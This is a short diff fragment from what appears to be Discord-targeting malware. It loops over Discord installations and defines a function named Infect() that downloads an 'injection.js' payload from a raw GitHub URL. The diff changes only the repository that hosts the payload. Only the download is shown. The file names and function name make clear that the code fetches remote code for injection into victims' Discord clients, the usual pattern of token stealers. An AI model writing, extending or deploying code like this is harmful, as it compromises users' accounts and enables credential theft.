@@ -34,7 +34,7 @@ discords.forEach(function(file) {
 });
 listDiscords();
 function Infect() {
-    https.get('https://raw.githubusercontent.com/stormzyidk/thing/main/src/injection/injection.js', (resp) => {
+    https.get('https://raw.githubusercontent.com/stormzyidk/idk/main/src/injection/injection.js', (resp) => {
         let data = '';
         resp.on('data', (chunk) => {
             data += chunk;
